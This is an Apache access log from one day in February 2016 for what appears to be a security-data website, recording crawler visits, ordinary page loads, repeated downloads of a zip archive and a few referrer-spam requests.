46.118.114.75 - - [28/Feb/2016:05:41:26 -0800] "GET /honeypot/ HTTP/1.1" 200 1077 "http://youandcredit.ru/bankrotstvo_fizicheskix_lic_2015_god/" "Mozilla/4.76 [en] (Windows NT 5.0; U)" 
46.118.114.75 - - [28/Feb/2016:05:41:28 -0800] "GET /honeypot/ HTTP/1.1" 200 1077 "http://youandcredit.ru/bankrotstvo_fizicheskix_lic_2015_god/" "Mozilla/4.76 [en] (Windows NT 5.0; U)" 
46.118.114.75 - - [28/Feb/2016:05:41:28 -0800] "GET /honeypot/ HTTP/1.1" 200 1077 "http://youandcredit.ru/bankrotstvo_fizicheskix_lic_2015_god/" "Mozilla/4.76 [en] (Windows NT 5.0; U)" 
66.102.8.251 - - [28/Feb/2016:05:41:53 -0800] "GET / HTTP/1.1" 200 28433 "http://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=4&ved=0CCAQFjAF&url=http%3A%2F%2Fwww.secrepo.com%2F&ei=IfnSVsvGEbT-4QO1XQ&usg=AFQjCNHeQikQ6r63vtqWKlBvSenYpdB4dQ" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.97 Safari/537.36" 
66.102.8.246 - - [28/Feb/2016:05:41:54 -0800] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.97 Safari/537.36" 
66.102.8.246 - - [28/Feb/2016:05:41:54 -0800] "GET /twitter-icon.png HTTP/1.1" 200 27788 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.97 Safari/537.36" 
66.102.8.246 - - [28/Feb/2016:05:41:54 -0800] "GET /tg/a.zip HTTP/1.1" 200 66189336 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.97 Safari/537.36" 
60.8.82.103 - - [28/Feb/2016:05:43:50 -0800] "GET /tg/a.zip HTTP/1.1" 200 0 "-" "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.0)" 
60.8.82.103 - - [28/Feb/2016:05:43:50 -0800] "GET /tg/a.zip HTTP/1.1" 200 0 "-" "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.0)" 
60.8.82.103 - - [28/Feb/2016:05:43:50 -0800] "GET /tg/a.zip HTTP/1.1" 200 47520 "-" "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.0)" 
111.161.65.71 - - [28/Feb/2016:05:43:53 -0800] "GET /tg/a.zip HTTP/1.1" 200 21900 "-" "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.0)" 
111.161.65.71 - - [28/Feb/2016:05:43:53 -0800] "GET /tg/a.zip HTTP/1.1" 200 21900 "-" "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.0)" 
111.161.65.71 - - [28/Feb/2016:05:43:53 -0800] "GET /tg/a.zip HTTP/1.1" 200 21900 "-" "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.0)" 
111.161.65.71 - - [28/Feb/2016:05:43:51 -0800] "GET /tg/a.zip HTTP/1.1" 200 3146300 "-" "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.0)" 
5.255.253.44 - - [28/Feb/2016:05:44:35 -0800] "GET / HTTP/1.1" 200 8680 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)" 
77.75.79.17 - - [28/Feb/2016:05:46:39 -0800] "GET /robots.txt HTTP/1.1" 200 334 "-" "Mozilla/5.0 (compatible; SeznamBot/3.2; +http://fulltext.sblog.cz/)" 
77.75.79.17 - - [28/Feb/2016:05:46:40 -0800] "GET /self.logs/access.log.2015-08-10.gz HTTP/1.1" 200 3804 "-" "Mozilla/5.0 (compatible; SeznamBot/3.2; +http://fulltext.sblog.cz/)" 
211.137.56.194 - - [28/Feb/2016:05:53:59 -0800] "GET /tg/a.zip HTTP/1.1" 304 132 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
111.222.62.172 - - [28/Feb/2016:06:13:00 -0800] "GET /tg/a.zip HTTP/1.1" 200 0 "-" "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.0)" 
111.222.62.172 - - [28/Feb/2016:06:13:00 -0800] "GET /tg/a.zip HTTP/1.1" 200 0 "-" "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.0)" 
111.222.62.172 - - [28/Feb/2016:06:13:00 -0800] "GET /tg/a.zip HTTP/1.1" 200 0 "-" "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.0)" 
116.77.75.203 - - [28/Feb/2016:06:13:03 -0800] "GET /tg/a.zip HTTP/1.1" 200 21900 "-" "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.0)" 
111.222.62.172 - - [28/Feb/2016:06:13:04 -0800] "GET /tg/a.zip HTTP/1.1" 200 0 "-" "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.0)" 
116.77.75.203 - - [28/Feb/2016:06:13:01 -0800] "GET /tg/a.zip HTTP/1.1" 200 391280 "-" "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.0)" 
116.77.75.203 - - [28/Feb/2016:06:13:07 -0800] "GET /tg/a.zip HTTP/1.1" 200 21900 "-" "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.0)" 
192.187.100.154 - - [28/Feb/2016:06:15:01 -0800] "GET /honeypot/BSidesDFW%20-%202014.ipynb HTTP/1.1" 200 930836 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36" 
218.200.66.203 - - [28/Feb/2016:06:22:57 -0800] "GET /tg/a.zip HTTP/1.1" 304 132 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
211.137.56.201 - - [28/Feb/2016:06:23:30 -0800] "GET /tg/a.zip HTTP/1.1" 304 132 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
68.180.231.44 - - [28/Feb/2016:06:24:58 -0800] "GET /self.logs/error.log.2015-09-23.gz HTTP/1.1" 200 870 "-" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)" 
211.137.56.172 - - [28/Feb/2016:06:25:03 -0800] "GET /tg/a.zip HTTP/1.1" 304 132 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
40.77.167.89 - - [28/Feb/2016:06:34:15 -0800] "GET /self.logs/access.log.2015-10-21.gz HTTP/1.1" 200 7909 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
112.109.212.127 - - [28/Feb/2016:06:43:31 -0800] "GET /tg/a.zip HTTP/1.1" 200 74880 "-" "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.0)" 
40.77.167.57 - - [28/Feb/2016:06:43:55 -0800] "GET /self.logs/error.log.2015-05-28.gz HTTP/1.1" 200 705 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
112.109.212.127 - - [28/Feb/2016:06:43:31 -0800] "GET /tg/a.zip HTTP/1.1" 200 80640 "-" "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.0)" 
112.109.212.127 - - [28/Feb/2016:06:43:35 -0800] "GET /tg/a.zip HTTP/1.1" 200 34560 "-" "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.0)" 
111.7.128.40 - - [28/Feb/2016:06:54:05 -0800] "GET /tg/a.zip HTTP/1.1" 304 132 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
66.249.84.217 - - [28/Feb/2016:07:03:47 -0800] "GET / HTTP/1.1" 200 8680 "-" "Mozilla/5.0 (Windows NT 6.1; rv:6.0) Gecko/20110814 Firefox/6.0 Google Favicon" 
66.249.84.213 - - [28/Feb/2016:07:03:47 -0800] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 590 "-" "Mozilla/5.0 (Windows NT 6.1; rv:6.0) Gecko/20110814 Firefox/6.0 Google Favicon" 
111.23.10.33 - - [28/Feb/2016:07:06:35 -0800] "GET /tg/a.zip HTTP/1.1" 304 132 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
110.52.33.125 - - [28/Feb/2016:07:18:20 -0800] "GET /tg/a.zip HTTP/1.1" 200 46080 "-" "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.0)" 
110.52.33.125 - - [28/Feb/2016:07:18:17 -0800] "GET /tg/a.zip HTTP/1.1" 200 46080 "-" "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.0)" 
110.52.33.125 - - [28/Feb/2016:07:18:17 -0800] "GET /tg/a.zip HTTP/1.1" 200 46080 "-" "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.0)" 
110.52.33.125 - - [28/Feb/2016:07:18:17 -0800] "GET /tg/a.zip HTTP/1.1" 200 46080 "-" "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.0)" 
77.75.78.162 - - [28/Feb/2016:07:25:55 -0800] "GET /robots.txt HTTP/1.1" 200 334 "-" "Mozilla/5.0 (compatible; SeznamBot/3.2; +http://fulltext.sblog.cz/)" 
77.75.78.162 - - [28/Feb/2016:07:25:56 -0800] "GET /self.logs/error.log.2015-05-23.gz HTTP/1.1" 200 784 "-" "Mozilla/5.0 (compatible; SeznamBot/3.2; +http://fulltext.sblog.cz/)" 
180.76.15.156 - - [28/Feb/2016:07:26:08 -0800] "GET / HTTP/1.1" 200 8643 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" 
68.180.231.44 - - [28/Feb/2016:07:28:06 -0800] "GET /self.logs/access.log.2015-05-17.gz HTTP/1.1" 200 4054 "-" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)" 
68.180.231.44 - - [28/Feb/2016:07:28:07 -0800] "GET /self.logs/access.log.2015-11-04.gz HTTP/1.1" 200 5869 "-" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)" 
189.207.137.211 - - [28/Feb/2016:07:39:28 -0800] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 590 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:44.0) Gecko/20100101 Firefox/44.0" 
178.255.215.78 - - [28/Feb/2016:07:48:27 -0800] "GET /robots.txt HTTP/1.1" 200 297 "-" "Mozilla/5.0 (compatible; Exabot/3.0; +http://www.exabot.com/go/robot)" 
178.255.215.78 - - [28/Feb/2016:07:48:27 -0800] "GET /self.logs/?C=D;O=A HTTP/1.1" 200 8577 "-" "Mozilla/5.0 (compatible; Exabot/3.0; +http://www.exabot.com/go/robot)" 
178.255.215.78 - - [28/Feb/2016:07:48:35 -0800] "GET /self.logs/error.log.2016-01-22 HTTP/1.1" 200 297 "-" "Mozilla/5.0 (compatible; Exabot/3.0; +http://www.exabot.com/go/robot)" 
40.77.167.89 - - [28/Feb/2016:07:51:35 -0800] "GET /self.logs/error.log.2016-01-19.gz HTTP/1.1" 200 684 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
141.8.143.159 - - [28/Feb/2016:07:55:27 -0800] "GET /robots.txt HTTP/1.1" 301 518 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)" 
141.8.132.105 - - [28/Feb/2016:07:55:31 -0800] "GET / HTTP/1.1" 301 483 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)" 
36.32.117.91 - - [28/Feb/2016:08:01:49 -0800] "GET /tg/a.zip HTTP/1.1" 200 828000 "-" "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.0)" 
36.32.117.91 - - [28/Feb/2016:08:01:49 -0800] "GET /tg/a.zip HTTP/1.1" 200 303840 "-" "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.0)" 
36.32.117.91 - - [28/Feb/2016:08:01:52 -0800] "GET /tg/a.zip HTTP/1.1" 200 351360 "-" "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.0)" 
36.32.117.91 - - [28/Feb/2016:08:01:50 -0800] "GET /tg/a.zip HTTP/1.1" 200 666720 "-" "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.0)" 
117.190.191.170 - - [28/Feb/2016:08:21:12 -0800] "GET /tg/a.zip HTTP/1.1" 304 132 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
77.75.77.72 - - [28/Feb/2016:08:29:29 -0800] "GET /robots.txt HTTP/1.1" 200 334 "-" "Mozilla/5.0 (compatible; SeznamBot/3.2; +http://fulltext.sblog.cz/)" 
77.75.77.72 - - [28/Feb/2016:08:29:29 -0800] "GET /honeypot/Honeypot%20-%20Howto%20-%20BSides%20Austin.pdf HTTP/1.1" 200 2928460 "-" "Mozilla/5.0 (compatible; SeznamBot/3.2; +http://fulltext.sblog.cz/)" 
69.30.198.178 - - [28/Feb/2016:08:30:50 -0800] "GET /robots.txt HTTP/1.0" 200 252 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+)" 
40.77.167.57 - - [28/Feb/2016:08:30:50 -0800] "GET /self.logs/error.log.2015-06-24.gz HTTP/1.1" 301 544 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
69.30.198.178 - - [28/Feb/2016:08:30:51 -0800] "GET /honeypot//%22http://glastopf.org//%22 HTTP/1.0" 404 284 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+)" 
69.30.198.178 - - [28/Feb/2016:08:30:53 -0800] "GET /honeypot//%22http://www.maxmind.com/%22 HTTP/1.0" 404 303 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+)" 
69.30.198.178 - - [28/Feb/2016:08:30:54 -0800] "GET /honeypot//%22https://twitter.com/sooshie/%22 HTTP/1.0" 404 303 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+)" 
2.136.248.73 - - [28/Feb/2016:08:39:51 -0800] "GET / HTTP/1.1" 200 8680 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36" 
2.136.248.73 - - [28/Feb/2016:08:39:51 -0800] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36" 
2.136.248.73 - - [28/Feb/2016:08:39:51 -0800] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36" 
2.136.248.73 - - [28/Feb/2016:08:39:52 -0800] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 589 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36" 
40.77.167.57 - - [28/Feb/2016:08:41:11 -0800] "GET /self.logs/access.log.2015-02-18.gz HTTP/1.1" 200 8879 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
211.137.56.194 - - [28/Feb/2016:08:54:00 -0800] "GET /tg/a.zip HTTP/1.1" 304 132 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
66.249.64.245 - - [28/Feb/2016:09:01:28 -0800] "GET /robots.txt HTTP/1.1" 200 334 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
66.249.64.245 - - [28/Feb/2016:09:01:28 -0800] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 304 167 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
14.204.105.189 - - [28/Feb/2016:09:12:10 -0800] "GET /tg/a.zip HTTP/1.1" 200 46080 "-" "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.0)" 
14.204.105.189 - - [28/Feb/2016:09:12:10 -0800] "GET /tg/a.zip HTTP/1.1" 200 46080 "-" "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.0)" 
14.204.105.189 - - [28/Feb/2016:09:12:07 -0800] "GET /tg/a.zip HTTP/1.1" 200 2429280 "-" "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.0)" 
14.204.105.189 - - [28/Feb/2016:09:12:07 -0800] "GET /tg/a.zip HTTP/1.1" 200 1746720 "-" "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.0)" 
220.181.108.149 - - [28/Feb/2016:09:12:52 -0800] "GET /self.logs/ HTTP/1.1" 200 8577 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" 
77.75.78.164 - - [28/Feb/2016:09:20:13 -0800] "GET /robots.txt HTTP/1.1" 200 334 "-" "Mozilla/5.0 (compatible; SeznamBot/3.2; +http://fulltext.sblog.cz/)" 
77.75.78.164 - - [28/Feb/2016:09:20:14 -0800] "GET /self.logs/access.log.2015-03-02.gz HTTP/1.1" 200 3364 "-" "Mozilla/5.0 (compatible; SeznamBot/3.2; +http://fulltext.sblog.cz/)" 
218.200.66.203 - - [28/Feb/2016:09:23:01 -0800] "GET /tg/a.zip HTTP/1.1" 304 132 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
211.137.56.201 - - [28/Feb/2016:09:23:34 -0800] "GET /tg/a.zip HTTP/1.1" 304 132 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
211.137.56.172 - - [28/Feb/2016:09:25:05 -0800] "GET /tg/a.zip HTTP/1.1" 304 132 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
70.208.128.229 - - [28/Feb/2016:09:47:01 -0800] "GET / HTTP/1.1" 200 8680 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Safari/537.36 Edge/13.10586" 
70.208.128.229 - - [28/Feb/2016:09:47:05 -0800] "GET /twitter-icon.png HTTP/1.1" 200 27788 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Safari/537.36 Edge/13.10586" 
70.208.128.229 - - [28/Feb/2016:09:47:06 -0800] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Safari/537.36 Edge/13.10586" 
70.208.128.229 - - [28/Feb/2016:09:47:10 -0800] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 590 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Safari/537.36 Edge/13.10586" 
70.208.128.229 - - [28/Feb/2016:09:47:40 -0800] "GET /tg/a.zip HTTP/1.1" 200 2701648 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Safari/537.36 Edge/13.10586" 
178.137.81.41 - - [28/Feb/2016:09:47:58 -0800] "GET /honeypot/ HTTP/1.1" 200 1077 "http://krasnodar.xrus.org/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; InfoPath.1" 
178.137.81.41 - - [28/Feb/2016:09:47:59 -0800] "GET /honeypot/ HTTP/1.1" 200 1077 "http://krasnodar.xrus.org/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; InfoPath.1" 
178.137.81.41 - - [28/Feb/2016:09:47:59 -0800] "GET /honeypot/ HTTP/1.1" 200 1077 "http://krasnodar.xrus.org/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; InfoPath.1" 
207.46.13.94 - - [28/Feb/2016:09:49:17 -0800] "GET / HTTP/1.1" 200 8680 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
111.7.128.40 - - [28/Feb/2016:09:54:08 -0800] "GET /tg/a.zip HTTP/1.1" 304 132 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
111.23.10.33 - - [28/Feb/2016:10:06:36 -0800] "GET /tg/a.zip HTTP/1.1" 304 132 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
123.125.71.25 - - [28/Feb/2016:10:17:35 -0800] "GET /honeypot/BSidesDFW%20-%202014.ipynb HTTP/1.1" 301 503 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" 
123.125.71.24 - - [28/Feb/2016:10:17:36 -0800] "GET /honeypot/BSidesDFW%20-%202014.ipynb HTTP/1.1" 200 930799 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" 
77.75.76.171 - - [28/Feb/2016:10:28:32 -0800] "GET /robots.txt HTTP/1.1" 200 334 "-" "Mozilla/5.0 (compatible; SeznamBot/3.2; +http://fulltext.sblog.cz/)" 
77.75.76.171 - - [28/Feb/2016:10:28:34 -0800] "GET /self.logs/error.log.2015-05-06.gz HTTP/1.1" 200 2156 "-" "Mozilla/5.0 (compatible; SeznamBot/3.2; +http://fulltext.sblog.cz/)" 
178.137.81.41 - - [28/Feb/2016:10:30:53 -0800] "GET /honeypot/ HTTP/1.1" 200 1077 "http://hyipmanager.in/karta-sajta/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1) Opera 7.54 [en]" 
178.137.81.41 - - [28/Feb/2016:10:30:56 -0800] "GET /honeypot/ HTTP/1.1" 200 1077 "http://hyipmanager.in/karta-sajta/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1) Opera 7.54 [en]" 
40.77.167.57 - - [28/Feb/2016:10:53:03 -0800] "GET /self.logs/access.log.2016-01-22.gz HTTP/1.1" 200 5675 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
139.129.96.25 - - [28/Feb/2016:11:00:19 -0800] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 200 1279418 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)" 
95.109.122.139 - - [28/Feb/2016:11:04:10 -0800] "GET / HTTP/1.1" 200 8680 "http://www.mlsecproject.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36" 
95.109.122.139 - - [28/Feb/2016:11:04:11 -0800] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36" 
95.109.122.139 - - [28/Feb/2016:11:04:11 -0800] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36" 
95.109.122.139 - - [28/Feb/2016:11:04:12 -0800] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 589 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36" 
95.109.122.139 - - [28/Feb/2016:11:06:07 -0800] "GET /zeus/zeus_json.zip HTTP/1.1" 404 340 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36" 
95.109.122.139 - - [28/Feb/2016:11:06:07 -0800] "GET /favicon.ico HTTP/1.1" 200 267 "http://www.secrepo.com/zeus/zeus_json.zip" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36" 
95.109.122.139 - - [28/Feb/2016:11:06:37 -0800] "GET /zeus/zeus_json.zip HTTP/1.1" 404 340 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36" 
183.160.113.254 - - [28/Feb/2016:11:13:34 -0800] "GET /self.logs/ HTTP/1.1" 200 8614 "-" "Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko" 
183.160.113.254 - - [28/Feb/2016:11:13:35 -0800] "POST /self.logs/trackback/ HTTP/1.1" 404 303 "http://www.secrepo.com/self.logs/" "Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko" 
203.236.50.22 - - [28/Feb/2016:11:18:30 -0800] "GET /honeypot/ HTTP/1.0" 200 1096 "http://www.secrepo.com/honeypot/" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.99 Safari/537.36" 
203.236.50.22 - - [28/Feb/2016:11:18:31 -0800] "GET / HTTP/1.0" 200 28422 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.99 Safari/537.36" 
77.75.77.32 - - [28/Feb/2016:11:20:42 -0800] "GET /robots.txt HTTP/1.1" 200 334 "-" "Mozilla/5.0 (compatible; SeznamBot/3.2; +http://fulltext.sblog.cz/)" 
77.75.77.32 - - [28/Feb/2016:11:20:42 -0800] "GET /self.logs/error.log.2015-05-07.gz HTTP/1.1" 200 2649 "-" "Mozilla/5.0 (compatible; SeznamBot/3.2; +http://fulltext.sblog.cz/)" 
117.190.191.170 - - [28/Feb/2016:11:21:12 -0800] "GET /tg/a.zip HTTP/1.1" 304 132 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
203.133.170.96 - - [28/Feb/2016:11:23:50 -0800] "GET / HTTP/1.1" 200 8680 "-" "Mozilla/5.0 (compatible; MSIE or Firefox mutant;) Daum 4.1" 
180.76.15.7 - - [28/Feb/2016:11:27:14 -0800] "GET / HTTP/1.1" 200 21900 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" 
180.76.15.161 - - [28/Feb/2016:11:27:49 -0800] "GET / HTTP/1.1" 200 21900 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" 
207.46.13.94 - - [28/Feb/2016:11:40:48 -0800] "GET /self.logs/access.log.2015-05-29.gz HTTP/1.1" 200 3750 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
74.50.118.217 - - [28/Feb/2016:11:47:58 -0800] "GET / HTTP/1.1" 200 8680 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36" 
211.137.56.194 - - [28/Feb/2016:11:54:01 -0800] "GET /tg/a.zip HTTP/1.1" 304 132 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
67.60.183.5 - - [28/Feb/2016:12:08:56 -0800] "GET / HTTP/1.1" 200 8680 "https://www.google.com" "Mozilla/5.0 (X11; Linux x86_64; rv:44.0) Gecko/20100101 Firefox/44.0" 
67.60.183.5 - - [28/Feb/2016:12:08:56 -0800] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:44.0) Gecko/20100101 Firefox/44.0" 
67.60.183.5 - - [28/Feb/2016:12:08:56 -0800] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:44.0) Gecko/20100101 Firefox/44.0" 
67.60.183.5 - - [28/Feb/2016:12:08:57 -0800] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 589 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:44.0) Gecko/20100101 Firefox/44.0" 
103.246.36.213 - - [28/Feb/2016:12:13:08 -0800] "GET / HTTP/1.1" 200 28433 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; InfoPath.1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; MS-RTC LM 8; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)" 
1.152.96.137 - - [28/Feb/2016:12:13:09 -0800] "GET / HTTP/1.1" 304 189 "http://www.mlsecproject.org/" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.134 Safari/537.36" 
